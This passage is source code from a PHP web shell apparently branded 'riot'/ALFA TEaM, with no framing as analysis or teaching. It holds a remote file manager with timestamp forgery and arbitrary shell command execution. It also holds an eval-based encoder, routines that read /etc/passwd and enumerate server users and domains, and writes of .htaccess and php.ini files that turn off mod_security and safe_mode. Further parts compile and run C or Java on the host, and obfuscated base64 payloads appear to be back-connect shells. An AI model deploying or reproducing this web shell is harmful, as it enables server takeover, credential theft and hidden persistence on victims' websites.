                (strtolower($v) == @$_POST["riot2"] ? '<b><span class="editor_actions"> ' . $v . " </span> </b>" : $v) .
                " | </span></a> "
            : '<a href="javascript:void(0);" onclick="editor(\'' .
                addslashes(!isset($rename_cache) ? $_POST["riot1"] : $rename_cache) .
                '\',\'' .
                strtolower($v) .
                '\',\'\',\'' .
                $_POST["c"] .
                '\',\'' .
                $_POST["riot4"] .
                '\',\'' .
                $ftype .
                '\')"><span class="editor_actions">' .
                (strtolower($v) == @$_POST["riot2"] ? '<b><span class="editor_actions"> ' . $v . " </span> </b>" : $v) .
                " | </span></a>";
    }
    echo "</div>";
    switch ($_POST["riot2"]) {
        case "view":
        case "edit":
            @chdir($_POST["c"]);
            $disabled_btn = "";
            if (!@is_writable($_POST["riot1"]) && !_riot_is_writable($_POST["riot1"])) {
                $disabled_btn = "disabled=disabled";
                $disabled_btn_style = "background: #4c1eba;color: #fff;";
            }
            if (!empty($_POST["riot3"])) {
                $_POST["riot3"] = substr($_POST["riot3"], 1);
                $time = @filemtime($_POST["riot1"]);
                $fp = @__write_file($_POST["riot1"], $_POST["riot3"]);
                if ($chdir_fals && $riot_canruncmd) {
                    $rname = $riot1_decoded;
                    $randname = $rname . rand(111, 9999);
                    $filepath = dirname($_SERVER["SCRIPT_FILENAME"]) . "/" . $randname;
                    if ($fp = @__write_file($filepath, $_POST["riot3"])) {
                        riotEx("mv '" . addslashes($filepath) . "' '" . addslashes($_POST["riot1"]) . "';rm -f '" . addslashes($filepath) . "'");
                    }
                }
                if ($fp) {
                    echo "Saved!<br>";
                    @touch($_POST["riot1"], $time, $time);
                }
            }
            echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">' .
                _riot_load_ace_options("editor") .
                '<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="riotAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = riot_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\'' .
                addslashes($riot1_decoded) .
                '\',\'edit\',\'1\'+ace_val,\'' .
                $_POST["c"] .
                '\',\'' .
                $_POST["riot4"] .
                '\',\'' .
                $ftype .
                '\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;' .
                $disabled_btn_style .
                '" ' .
                $disabled_btn .
                '>save</button></div><pre class="ml1 view_ml_content">';
            echo htmlspecialchars(__read_file($_POST["riot1"]));
            echo "</pre></div></div>";
            break;
        case "highlight":
            @chdir($_POST["c"]);
            if (@is_readable($_POST["riot1"])) {
                echo '<div class="editor-view"><div class="view-content"><div class="ml1" style="background-color: #e1e1e1;color:black;">';
                $code = @highlight_file($_POST["riot1"], true);
                echo str_replace(["<span ", "</span>"], ["<font ", "</font>"], $code) . "</div></div></div>";
            }
            break;
        case "delete":
            @chdir($_POST["c"]);
            if (@is_writable($_POST["riot1"]) || $GLOBALS["glob_chdir_false"]) {
                $deleted = true;
                if (!@unlink($_POST["riot1"])) {
                    $deleted = false;
                    if ($riot_canruncmd) {
                        if (_riot_is_writable($_POST["riot1"])) {
                            riotEx("rm -f '" . addslashes($_POST["riot1"]) . "'");
                            $deleted = true;
                        }
                    }
                }
                if ($deleted) {
                    echo 'File Deleted...<script>var elem = $("' . $_POST["riot4"] . '").parentNode;elem.parentNode.removeChild(elem);delete editor_files["' . $_POST["riot4"] . '"];</script>';
                } else {
                    echo "Error...";
                }
            }
            break;
        case "chmod":
            @chdir($_POST["c"]);
            if (!empty($_POST["riot3"])) {
                $perms = 0;
                for ($i = strlen($_POST["riot3"]) - 1; $i >= 0; --$i) {
                    $perms += (int) $_POST["riot3"][$i] * pow(8, strlen($_POST["riot3"]) - $i - 1);
                }
                if (!@chmod($_POST["riot1"], $perms)) {
                    if ($chdir_fals && $riot_canruncmd) {
                        riotEx("cd '" . addslashes($_POST["c"]) . "';chmod " . addslashes($_POST["riot3"]) . " '" . addslashes($riot1_decoded) . "'");
                        echo "Success!";
                    } else {
                        echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.riot3.value="";</script>';
                    }
                } else {
                    echo "Success!";
                }
            }
            clearstatcache();
            AlfaNum(8, 9, 10, 7, 6, 5, 4, 2, 1);
            if ($chdir_fals) {
                $file_perm = $file_info[5];
            } else {
                $file_perm = substr(sprintf("%o", @fileperms($_POST["riot1"])), -4);
            }
            echo '<script>riot3_="";</script><form onsubmit="editor(\'' .
                addslashes($_POST["riot1"]) .
                '\',\'' .
                $_POST["riot2"] .
                '\',this.chmod.value,\'' .
                $_POST["c"] .
                '\',\'' .
                $_POST["riot4"] .
                '\',\'' .
                $ftype .
                '\');return false;"><input type="text" name="chmod" value="' .
                $file_perm .
                '"><input type=submit value=" "></form>';
            break;
        case "hexdump":
            @chdir($_POST["c"]);
            $c = __read_file($_POST["riot1"]);
            $n = 0;
            $h = ["00000000<br>", "", ""];
            $len = strlen($c);
            for ($i = 0; $i < $len; ++$i) {
                $h[1] .= sprintf("%02X", ord($c[$i])) . " ";
                switch (ord($c[$i])) {
                    case 0:
                        $h[2] .= " ";
                        break;
                    case 9:
                        $h[2] .= " ";
                        break;
                    case 10:
                        $h[2] .= " ";
                        break;
                    case 13:
                        $h[2] .= " ";
                        break;
                    default:
                        $h[2] .= $c[$i];
                        break;
                }
                $n++;
                if ($n == 32) {
                    $n = 0;
                    if ($i + 1 < $len) {
                        $h[0] .= sprintf("%08X", $i + 1) . "<br>";
                    }
                    $h[1] .= "<br>";
                    $h[2] .= "\n";
                }
            }
            echo '<div class="editor-view"><div class="view-content"><table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=gray><span style="font-weight: normal;"><pre>' .
                $h[0] .
                "</pre></span></td><td bgcolor=#282828><pre>" .
                $h[1] .
                "</pre></td><td bgcolor=#333333><pre>" .
                htmlspecialchars($h[2]) .
                "</pre></td></tr></table></div></div>";
            break;
        case "rename":
            @chdir($_POST["c"]);
            $riot1_escape = addslashes($_POST["riot1"]);
            $riot3_escape = addslashes($_POST["riot3"]);
            if (!empty($_POST["riot3"])) {
                $cmd_rename = false;
                if ($chdir_fals && $riot_canruncmd) {
                    if (_riot_is_writable($_POST["riot1"])) {
                        $riot1_escape = addslashes($riot1_decoded);
                        riotEx("cd '" . addslashes($_POST["c"]) . "';mv '" . $riot1_escape . "' '" . addslashes($_POST["riot3"]) . "'");
                    } else {
                        $cmd_rename = true;
                    }
                } else {
                    $riot1_escape = addslashes($_POST["riot1"]);
                }
                if (!@rename($_POST["riot1"], $_POST["riot3"]) && $cmd_rename) {
                    echo 'Can\'t rename!<br>';
                } else {
                    echo 'Renamed!<script>try{$("' .
                        $_POST["riot4"] .
                        '").innerHTML = "<div class=\'editor-icon\'>"+loadType(\'' .
                        $riot3_escape .
                        '\',\'' .
                        $ftype .
                        '\',\'' .
                        $_POST["riot4"] .
                        '\')+"</div><div class=\'editor-file-name\'>' .
                        $riot3_escape .
                        '</div>";editor_files["' .
                        $_POST["riot4"] .
                        '"].file = "' .
                        $riot3_escape .
                        '";updateFileEditor("' .
                        $riot1_escape .
                        '", "' .
                        $riot3_escape .
                        '");' .
                        ($ftype == "dir" ? "updateDirsEditor('" . $_POST["riot4"] . "','" . $riot1_escape . "');" : "") .
                        "}catch(e){console.log(e)}</script>";
                    $riot1_escape = $riot3_escape;
                }
            }
            echo '<form onsubmit="editor(\'' .
                $riot1_escape .
                '\',\'' .
                $_POST["riot2"] .
                '\',this.name.value,\'' .
                $_POST["c"] .
                '\',\'' .
                $_POST["riot4"] .
                '\',\'' .
                $ftype .
                '\');return false;"><input type="text" name="name" value="' .
                addslashes(htmlspecialchars(isset($_POST["riot3"]) && $_POST["riot3"] != "" ? $_POST["riot3"] : $riot1_decoded)) .
                '"><input type=submit value=" "></form>';
            break;
        case "touch":
            @chdir($_POST["c"]);
            if (!empty($_POST["riot3"])) {
                $time = strtotime($_POST["riot3"]);
                if ($time) {
                    $touched = false;
                    if ($chdir_fals && $riot_canruncmd) {
                        riotEx("cd '" . addslashes($_POST["c"]) . "';touch -d '" . htmlspecialchars(addslashes($_POST["riot3"])) . "' '" . addslashes($riot1_decoded) . "'");
                        $touched = true;
                    }
                    if (!@touch($_POST["riot1"], $time, $time) && !$touched) {
                        echo "Fail!";
                    } else {
                        echo "Touched!";
                    }
                } else {
                    echo "Bad time format!";
                }
            }
            clearstatcache();
            echo '<script>riot3_="";</script><form onsubmit="editor(\'' .
                addslashes($_POST["riot1"]) .
                '\',\'' .
                $_POST["riot2"] .
                '\',this.touch.value,\'' .
                $_POST["c"] .
                '\',\'' .
                $_POST["riot4"] .
                '\',\'' .
                $ftype .
                '\');return false;"><input type=text name=touch value="' .
                date("Y-m-d H:i:s", $chdir_fals ? $file_info[4] : @filemtime($_POST["riot1"])) .
                '"><input type=submit value=" "></form>';
            break;
        case "image":
            @chdir($_POST["c"]);
            echo "<hr>";
            $file = $_POST["riot1"];
            $image_info = @getimagesize($file);
            if (is_array($image_info) || $chdir_fals) {
                $width = (int) $image_info[0];
                $height = (int) $image_info[1];
                if ($chdir_fals && $riot_canruncmd) {
                    $source = riotEx("cat '" . addslashes($file) . "' | base64");
                    list($width, $height) = explode(":", riotEx("identify -format '%w:%h' '" . addslashes($file) . "'"));
                    $mime = explode(":", riotEx("file --mime-type '" . addslashes($file) . "'"));
                    $image_info["mime"] = $mime[1];
                } else {
                    $source = __ZW5jb2Rlcg(__read_file($file, false));
                }
                $image_info_h = "Image type = <span>[</span> " . $image_info["mime"] . " <span>]</span><br>Image Size = <span>[ </span>" . $width . " x " . $height . "<span> ]</span><br>";
                if ($width > 800) {
                    $width = 800;
                }
                echo $content =
                    "<div class='editor-view'><div class='view-content'><center>" .
                    $image_info_h .
                    "<br><img id='viewImage' style='max-width:100%;border:1px solid red;' src='data:" .
                    $image_info["mime"] .
                    ";base64," .
                    $source .
                    "' alt='" .
                    $file .
                    "'></center></div></div><br>";
            }
            break;
    }
    echo "</div>";
    riotFooter();
}
function findicon($file, $type)
{
    $f = "https://dev.artikelspiner.id/icon/";
    $s = "https://icons.iconarchive.com/";
    $notfound = "http://www.indolentindio.com/wp-content/uploads/2009/02/";
    $types = [
        "json",
        "ppt",
        "pptx",
        "xls",
        "xlsx",
        "msi",
        "config",
        "cgi",
        "pm",
        "c",
        "cpp",
        "cs",
        "java",
        "aspx",
        "asp",
        "db",
        "ttf",
        "eot",
        "woff",
        "woff2",
        "woff",
        "apk",
        "cab",
        "bz2",
        "tgz",
        "dmg",
        "izo",
        "jar",
        "7z",
        "pl",
        "go",
        "conf",
        "htaccess",
        "iso",
        "rar",
        "bat",
        "sh",
        "riot",
        "gz",
        "tar",
        "php",
        "php4",
        "php5",
        "phtml",
        "html",
        "htm",
        "zip",
        "png",
        "jpg",
        "jpeg",
        "gif",
        "bmp",
        "ico",
        "txt",
        "js",
        "rb",
        "py",
        "xml",
        "css",
        "sql",
        "pl",
        "ini",
        "dll",
        "exe",
        "mp3",
        "mp4",
        "m4a",
        "mov",
        "flv",
        "swf",
        "mkv",
        "avi",
        "wmv",
        "mpg",
        "mpeg",
        "dat",
        "pdf",
        "3gp",
        "doc",
        "docx",
        "docm",
        "",
    ];
    if ($type != "file") {
        return $file == ".." ? $s . "icons/graphicloads/100-flat-2/256/arrow-back-1-icon.png" : $s . "icons/fasticon/creature-folders/512/blue-folder-icon.png";
    } else {
        $ext = explode(".", $file);
        $ext = end($ext);
        $ext = strtolower($ext);
        return in_array($ext, $types) ? $f . $ext . ".png" : $notfound . "caution.png";
    }
}
function riotdlfile()
{
    if (isset($_POST["c"], $_POST["file"])) {
        $basename = rawurldecode(basename($_POST["file"]));
        $_POST["file"] = str_replace("//", "/", $_POST["c"] . "/" . $basename);
        $riot_canruncmd = _riot_can_runCommand(true, true);
        if ((@is_file($_POST["file"]) && @is_readable($_POST["file"])) || $riot_canruncmd) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=\"" . addslashes($basename) . "\"");
            header("Content-Type: application/octet-stream");
            if ($GLOBALS["glob_chdir_false"]) {
                $randname = $basename . rand(111, 9999);
                $scriptpath = dirname($_SERVER["SCRIPT_FILENAME"]);
                $filepath = $scriptpath . "/" . $randname;
                if (_riot_is_writable($scriptpath)) {
                    riotEx("cp '" . addslashes($_POST["file"]) . "' '" . addslashes($filepath) . "'");
                    readfile($filepath);
                    @unlink($filepath);
                } else {
                    riotEx("cat '" . addslashes($_POST["file"]) . "'");
                }
            } else {
                readfile($_POST["file"]);
            }
        } else {
            echo "Error...!";
        }
    }
}
function __riot_set_cookie($key, $value)
{
    $_COOKIE[$key] = $value;
    @setcookie($key, $value, time() + 86400 * 7, "/");
}
function riothash()
{
    if (!function_exists("hex2bin")) {
        function hex2bin($p)
        {
            return decbin(hexdec($p));
        }
    }
    if (!function_exists("full_urlencode")) {
        function full_urlencode($p)
        {
            $r = "";
            for ($i = 0; $i < strlen($p); ++$i) {
                $r .= "%" . dechex(ord($p[$i]));
            }
            return strtoupper($r);
        }
    }
    $stringTools = [
        'Base64_encode ( $string )' => '__ZW5jb2Rlcg($s)',
        'Base64_decode ( $string )' => '__ZGVjb2Rlcg($s)',
        'strrev ( $string )' => 'strrev($s)',
        'bin2hex ( $string )' => 'bin2hex($s)',
        'hex2bin ( $string )' => 'hex2bin($s)',
        'md5 ( $string )' => 'md5($s)',
        'sha1 ( $string )' => 'sha1($s)',
        'hash ( "sha251", $string ) --> sha251' => 'hash("sha256",$s)',
        'hash ( "sha384", $string ) --> sha384' => 'hash("sha384",$s)',
        'hash ( "sha512", $string ) --> sha512' => 'hash("sha512",$s)',
        'crypt ( $string )' => 'crypt($s)',
        'crc32 ( $string )' => 'crc32($s)',
        'str_rot13 ( $string )' => 'str_rot13($s)',
        'urlencode ( $string )' => 'urlencode($s)',
        'urldecode  ( $string )' => 'urldecode($s)',
        'full_urlencode  ( $string )' => 'full_urlencode($s)',
        'htmlspecialchars  ( $string )' => 'htmlspecialchars($s)',
        'base64_encode (gzdeflate( $string , 9)) --> Encode' => '__ZW5jb2Rlcg(gzdeflate($s, 9))',
        'gzinflate (base64_decode( $string )) --> Decode' => '@gzinflate(__ZGVjb2Rlcg($s))',
        'str_rot13 (base64_encode( $string )) --> Encode' => 'str_rot13(__ZW5jb2Rlcg($s))',
        'base64_decode (str_rot13( $string )) --> Decode' => '__ZGVjb2Rlcg(str_rot13($s))',
        'str_rot13 (base64_encode(gzdeflate( $string , 9))) --> Encode' => 'str_rot13(__ZW5jb2Rlcg(gzdeflate($s,9)))',
        'gzinflate (base64_decode(str_rot13( $string ))) --> Decode' => '@gzinflate(__ZGVjb2Rlcg(str_rot13($s)))',
    ];
    riothead();
    echo "<div class=header>";
    echo "<form onSubmit='g(\"hash\",null,this.selectTool.value,this.input.value);return false;'><div class='txtfont'>Method:</div> <select name='selectTool' style='width:400px;'>";
    foreach ($stringTools as $k => $v) {
        echo "<option value='" . htmlspecialchars($v) . "' " . ($_POST["riot1"] == $v ? "selected" : "") . ">" . $k . "</option>";
    }
    echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>" . (empty($_POST["riot1"]) ? "" : htmlspecialchars(@$_POST["riot2"])) . "</textarea></form>";
    if (!empty($_POST["riot1"])) {
        $string = addslashes($_POST["riot2"]);
        $string = str_replace('\"', '"', $string);
        $alg = $_POST["riot1"];
        $code = str_replace('$s', "'" . $string . "'", $alg);
        ob_start();
        eval("echo " . $code . ";");
        $res = ob_get_contents();
        ob_end_clean();
        if (in_array($alg, $stringTools)) {
            echo '<textarea class="bigarea">' . htmlspecialchars($res) . "</textarea>";
        }
    }
    echo "</div>";
    riotFooter();
}
function __pre()
{
    return '<pre id="strOutput" style="margin-top:5px" class="ml1">';
}
function riotproc()
{
    riothead();
    echo "<Div class=header><br><center>";
    if (empty($_POST["ajax"]) && !empty($_POST["riot1"])) {
        $_COOKIE[md5($_SERVER["HTTP_HOST"]) . "ajax"] = false;
    }
    if ($GLOBALS["sys"] == "win") {
        $process = [
            "Task List" => "tasklist /V",
            "System Info" => "systeminfo",
            "Active Connections" => "netstat -an",
            "Running Services" => "net start",
            "User Accounts" => "net user",
            "Show Computers" => "net view",
            "ARP Table" => "arp -a",
            "IP Configuration" => "ipconfig /all",
        ];
    } else {
        $process = [
            "Process status" => "ps aux",
            "Syslog" => "cat /etc/syslog.conf",
            "Resolv" => "cat /etc/resolv.conf",
            "Hosts" => "cat /etc/hosts",
            "Cpuinfo" => "cat /proc/cpuinfo",
            "Version" => "cat /proc/version",
            "Sbin" => "ls -al /usr/sbin",
            "Interrupts" => "cat /proc/interrupts",
            "lsattr" => "lsattr -va",
            "Uptime" => "uptime",
            "Fstab" => "cat /etc/fstab",
        ];
    }
    foreach ($process as $n => $link) {
        echo '<a href="javascript:void(0);" onclick="g(\'proc\',null,\'' . $link . '\')"> | ' . $n . " | </a>";
    }
    echo "</center><br>";
    if (!empty($_POST["riot1"])) {
        echo "<pre class='ml1' style='margin-top:5px' >";
        if ($GLOBALS["glob_chdir_false"] && !empty($_POST["c"])) {
            $cmd = "cd '" . addslashes($_POST["c"]) . "';";
        }
        echo riotEx($cmd . $_POST["riot1"], true);
        echo "</pre>";
    }
    echo "</div>";
    riotfooter();
}
function riotsafe()
{
    riothead();
    echo "<div class=header><center><br><div class='txtfont_header'>| Auto ByPasser |</div>";
    echo '<h3><a href=javascript:void(0) onclick="g(\'safe\',null,\'php.ini\',null)">| PHP.INI | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,\'ini\')">| .htaccess(apache) | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,\'pl\')">| .htaccess(LiteSpeed) |</a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,\'passwd\')">| Read-Passwd | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,\'users\')">| Read-Users | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,null,\'valiases\')">| Get-User | </a><a href=javascript:void(0) onclick="g(\'safe\',null,null,null,null,null,null,null,null,\'domains\')">| Get-Domains | </a></center></h3>';
    if (!empty($_POST["riot8"]) && isset($_POST["riot8"]) == "domains") {
        if (!_riot_file_exists("/etc/virtual/domainowners")) {
            echo __pre();
            $riotexec9 = _riot_file("/etc/named.conf");
            if (is_array($riotexec9)) {
                foreach ($riotexec9 as $riotexec13) {
                    if (@eregi("zone", $riotexec13)) {
                        preg_match_all('#zone "(.*)"#', $riotexec13, $riotexec14);
                        if (strlen(trim($riotexec14[1][0])) > 2) {
                            echo $riotexec14[1][0] . "<br>";
                        }
                    }
                }
            }
        } else {
            echo __pre();
            $users = _riot_file("/etc/virtual/domainowners");
            if (is_array($users)) {
                foreach ($users as $boz) {
                    $dom = explode(":", $boz);
                    echo $dom[0] . "\n";
                }
            }
        }
    }
    if (!empty($_POST["riot6"]) && isset($_POST["riot6"]) == "valiases") {
        echo '
<form onsubmit="g(\'safe\',null,null,null,null,null,null,\'valiases\',this.site.value,null,\'>>\'); return false;" method="post" /><center><div class="txtfont">Url: </font><input type="text" placeholder="site.com" name="site" /> <input type="submit" value=" " name="go" /></form></center>';
        if (isset($_POST["riot9"]) && $_POST["riot9"] == ">>") {
            if (!_riot_file_exists("/etc/virtual/domainowners")) {
                $site = trim($_POST["riot7"]);
                $rep = str_replace(["https://", "http://", "www."], "", $site);
                $user = "";
                if (function_exists("posix_getpwuid") && function_exists("fileowner")) {
                    if ($user = @posix_getpwuid(@fileowner("/etc/valiases/{$rep}"))) {
                        $user = $user["name"];
                    }
                } else {
                    if (_riot_can_runCommand(true, true)) {
                        $user = riotEx("stat -c '%U' /etc/valiases/" . $rep);
                    }
                }
                if (!empty($user) && $user != "root") {
                    echo __pre() .
                        "<center><table border='1'><tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#4c1eba\">{$user}</font></b></td></tr><tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#4c1eba\">{$rep}</font></b></td></tr></table></center>";
                } else {
                    echo __pre() . "<center><b>No such file or directory Or Disable Functions is not NONE...</b></center>";
                }
            } else {
                $site = trim($_POST["riot7"]);
                $rep = str_replace(["https://", "http://", "www."], "", $site);
                $users = _riot_file("/etc/virtual/domainowners");
                foreach ($users as $boz) {
                    $ex = explode(":", $boz);
                    if ($ex[0] == $rep) {
                        echo __pre() .
                            "<center><table border='1'>
<tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#4c1eba\">" .
                            trim($ex[1]) .
                            "</font></b></td></tr>
<tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#4c1eba\">{$rep}</font></b></td></tr></table></center>";
                        break;
                    }
                }
            }
        }
    }
    if (!empty($_POST["riot5"]) && isset($_POST["riot5"])) {
        if (!_riot_file_exists("/etc/virtual/domainowners")) {
            echo __pre();
            $i = 0;
            while ($i < 60000) {
                $line = @posix_getpwuid($i);
                if (!empty($line)) {
                    while (list($key, $vl) = each($line)) {
                        echo $vl . "\n";
                        break;
                    }
                }
                $i++;
            }
        } else {
            echo __pre();
            $users = _riot_file("/etc/virtual/domainowners");
            foreach ($users as $boz) {
                $user = explode(":", $boz);
                echo trim($user[1]) . "<br>";
            }
        }
    }
    if (!empty($_POST["riot4"]) && isset($_POST["riot4"])) {
        echo __pre();
        if (_riot_can_runCommand(true, true)) {
            echo __read_file("/etc/passwd");
        } elseif (function_exists("posix_getpwuid")) {
            for ($uid = 0; $uid < 60000; $uid++) {
                $ara = @posix_getpwuid($uid);
                if (!empty($ara)) {
                    while (list($key, $val) = each($ara)) {
                        echo "$val:";
                    }
                    echo "\n";
                }
            }
        } else {
            __alert("failed...");
        }
    }
    if (!empty($_POST["riot2"]) && isset($_POST["riot2"])) {
        @__write_file($GLOBALS["cwd"] . ".htaccess", "#Generated By Sole Sad and Invisible\n<IfModule mod_security.c>\nSec------Engine Off\nSec------ScanPOST Off\n</IfModule>");
        echo "<center><b><big>htaccess for Apache created...!</center></b></big>";
    }
    if (!empty($_POST["riot1"]) && isset($_POST["riot1"])) {
        @__write_file($GLOBALS["cwd"] . "php.ini", "safe_mode=OFF\ndisable_functions=ByPassed By IDM(ALFA TEaM)");
        echo "<center><b><big> php.ini created...!</center></b></big>";
    }
    if (!empty($_POST["riot3"]) && isset($_POST["riot3"])) {
        @__write_file($GLOBALS["cwd"] . ".htaccess", "#Generated By Sole Sad and Invisible\n<Files *.php>\nForceType application/x-httpd-php4\n</Files>\n<IfModule mod_security.c>\nSecFilterEngine Off\nSecFilterScanPOST Off\n</IfModule>");
        echo "<center><b><big>htaccess for Litespeed created...!</center></b></big>";
    }
    echo "<br></div>";
    riotfooter();
}
function __get_resource($content)
{
    return @gzinflate(__ZGVjb2Rlcg($content));
}
function __write_file($file, $content)
{
    if ($fh = @fopen($file, "wb")) {
        if (fwrite($fh, $content) !== false) {
            return true;
        }
    }
    return false;
}
function bcinit($evalType, $evalCode, $evalOptions, $evalArguments)
{
    $res = "<font color='red'>[ Success...! ]</font>";
    $err = "<font color='red'>[ Failed...! ]</font>";
    if ($evalOptions != "") {
        $evalOptions = $evalOptions . " ";
    }
    if ($evalArguments != "") {
        $evalArguments = " " . $evalArguments;
    }
    if ($evalType == "c") {
        $tmpdir = ALFA_TEMPDIR;
        chdir($tmpdir);
        if (is_writable($tmpdir)) {
            $uniq = substr(md5(time()), 0, 8);
            $filename = $evalType . $uniq . ".c";
            $path = $filename;
            if (__write_file($path, $evalCode)) {
                $ext = $GLOBALS["sys"] == "win" ? ".exe" : ".out";
                $pathres = $filename . $ext;
                $evalOptions = "-o " . $pathres . " " . $evalOptions;
                $cmd = "gcc " . $evalOptions . $path;
                riotEx($cmd);
                if (is_file($pathres)) {
                    if (chmod($pathres, 0755)) {
                        $cmd = $pathres . $evalArguments;
                        riotEx($cmd);
                    } else {
                        $res = $err;
                    }
                    unlink($pathres);
                } else {
                    $res = $err;
                }
                unlink($path);
            } else {
                $res = $err;
            }
        }
        return $res;
    } elseif ($evalType == "java") {
        $tmpdir = ALFA_TEMPDIR;
        chdir($tmpdir);
        if (is_writable($tmpdir)) {
            if (preg_match("/class\ ([^{]+){/i", $evalCode, $r)) {
                $classname = trim($r[1]);
                $filename = $classname;
            } else {
                $uniq = substr(md5(time()), 0, 8);
                $filename = $evalType . $uniq;
                $evalCode = "class " . $filename . " { " . $evalCode . " } ";
            }
            $path = $filename . ".java";
            if (__write_file($path, $evalCode)) {
                $cmd = "javac " . $evalOptions . $path;
                riotEx($cmd);
                $pathres = $filename . ".class";
                if (is_file($pathres)) {
                    if (chmod($pathres, 0755)) {
                        $cmd = "java " . $filename . $evalArguments;
                        riotEx($cmd);
                    } else {
                        $res = $err;
                    }
                    unlink($pathres);
                } else {
                    $res = $err;
                }
                unlink($path);
            } else {
                $res = $err;
            }
        }
        return $res;
    }
    return false;
}
function riotconnect()
{
    riothead();
    $php =
        "7VZta9swEP5e6H9QjaE2S5uXfhg0pDBYPw7KVtiHtjOOLNcitqVJ8pKxpb99d36L4zid17WwQV1wrbvTo0e6Oz1hSgnlKSaFMjy9d0bu9PBAM+MZnjAv5gk3hU3MPZ7ImFNuvDDOdOSg1Ta+umdGkxlhKxmLgDkWsQaktOchFL3js7O3OFj6MEizOMYBaw50BAMLUIAJub78+GG2Mkwl06tP49nxrX31+f3F8bR0g206nPN0CJNOuIXTE5z9QN7FoU+umZ8QHbE4Jg/k8AD9PCQOFVlqnIqyS2ZAyyU/Dg8IPLYEgNI3LU05I6saGRzBogFa1oTFmu1BnXSi6pvRXRO5No/vtpfw6SJfomAdZik1XKQeW3FttHMsaWpiLxRqcew2FuIBTN748vSgBzEK74yc4IYBxzjjtru0j5p2KTRfeVANmgeO2wFQUkTe1dlsGGHatVGQC08LuoCa0kx9Y8qxDJXnw+HoNP87t8gp0IeaYUqlovgP8yoiFURZkyKDw9YDclYztenOQj6lTGJcczcQYkQslsBAZ3MYOTKSXpb6CXPcARkBpptv0lrydLMPfMKl4oY5NgV2CdCFtNElHskpsS6sahF8lhGPGZ4oOQKk0Ici2UKqiyLE1ANic3J97orde4lvaORYQxrcEufmy62+e+MOOfYWnpVS7g5ujh1gGYB7U1VtdK69gCsHIgGCRtV3R7QtAGt7r62oTRsYxZPmEduyPEysFov8/En2RnzNIMIlc8jgooWP6AUNHxr7coWTkIi1k4TWxGbGRHNv60ZWaSw0a+WgMtalU2xxbzU059oB1ryvlP/dGZHZRflpSS4ZJM5SFtTZuMOxRMek27G1gFTY5EpQT0iWAstogKtiUXDZjMSUHEGmFdMiUxTYSqyY7d7Hp9Fe8xi6B0UAweCygp7oFTnuHTnpFUlbQWVPGZXt9lJ+QzIRYhaxyIrvgpXbXVO28uss5Tms9lBSbHdCzTFmFO4U5UPkEl8MXqheXS3MU6+xgvL3dCvHmwDggyKO6q42rOqtyorN21HrxwjU2+vDog5+nAp9EovJn7CY/D2Ljl7XXb3eeQEUp73PM97r2S6gvFcrb61p6+YPiEo9Ufa31TNEOSsaPSrvfZbia0v/nknb9LNr207uXrWtib9P2+AHa1910z3UrYeQ6VchexEh008SMv0kIdMvLmS65+Wt/ych0/+EkP2ORV8he2nN+gU=";
    $python =
        "pVRtT9swEP6cSv0PxptWR80M7YY0wYJUQZjQBlRtp30AVqXOpYmWOpHtQPnCb5/tJG1AHUKaqra+V99z95zf7e2XUuwvUr4P/B4VjyrJebeTropcKCTAk+WiEDkDKb1cevJRf3P2B5Sn0hV0O4WPcbeT2N8IYiQTyDLC3KNuxzFx/jaejvMCOGGe9fFnotTZVZSX6pnTxTgwahBilzrlL7WuvkmAKgVHRk2rlFRAGBG336h0upZqVSjiUuAsj4D0ShV//NLTeSoIIVNpzmsMaYxySXm4gj0fc4WNzol9RuM0A54Tc7ujPXRjFKwIhrVt3CyYXPprBWJ1PJ4O/N778a+zk95xbdWqY9tymaCPKfr6AfelEiR2+xidtIXhVjIXQSbBFvCQ6NuR6aAVHSUeq4MjdGkC2D0ZHAw/uzQCCxFbiNgW68CaQaFq/yKUstI2uR2DWWMjwj05qDXOwhdAJYSCJQSz6BaRm9+38q7vYk94cRYupXG4+HZ1PQlOR9PAreN0qkWTo+5lEaqEpjJKBVnQpcjLggxcd+NkmsmSF9bGqEcJPCL/mmDj18Ki8xl+WVYKt11JqVDII4tUnw3WOruRKkebB9XkOg+11HCkqeBoSz58y3FfF78ExR4Mz/CJ3omlr5lBQ7G810tV9XXp+v7Q7oe/vBncdTuQtSyf2hYn0YehddGVwDpVuhtm6VKuSKFP0q+2kVZ/pJZG5/OLq2BWryqdXp9+n09nk2B0aWI0TGUsebEJmF7/mBuvdsx8EvycBqOzs4lnLn1ZvaSawREh+IDaD/YKOwBJs1TvAieHRjLM1Csfur7uAjPEsyvT4qB5R6jMAAqLbTu8navXUIDgJzTK4hDNIFyhqZkvetIT2M2JLSFeC8ebp2F3ls3D8KwZdmAGJtLEzTkHpghJ6mbsxnn4Bpzy/3C+Fv5GnNL9Cw==";
    $perl =
